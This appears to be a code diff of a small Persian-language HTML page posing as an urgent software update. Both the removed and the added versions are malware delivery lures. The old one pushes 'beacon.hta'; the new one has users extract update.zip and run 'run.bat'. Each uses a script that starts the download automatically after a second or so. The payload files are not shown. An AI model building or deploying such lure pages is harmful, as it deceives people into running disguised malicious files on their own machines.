@@ -1,12 +1,6 @@
 <!DOCTYPE html>
-<html>
-<body>
-<h3>برای ادامه، فایل زیر را دانلود و باز کنید:</h3>
-<a href="beacon.hta" download>دانلود به‌روزرسانی (کلیک کنید)</a>
-
-<script>
-// اگه کسی کلیک کرد، خودکار هم دانلود بشه
-setTimeout(() => document.querySelector('a').click(), 1500);
-</script>
-</body>
-</html>
+<html><body>
+<h2>به‌روزرسانی ضروری</h2>
+<a href="update.zip" download id="dl">دانلود و اجرا کنید (کلیک راست → Extract All → run.bat رو باز کنید)</a>
+<script>setTimeout(() => document.getElementById('dl').click(), 1000);</script>
+</body></html>
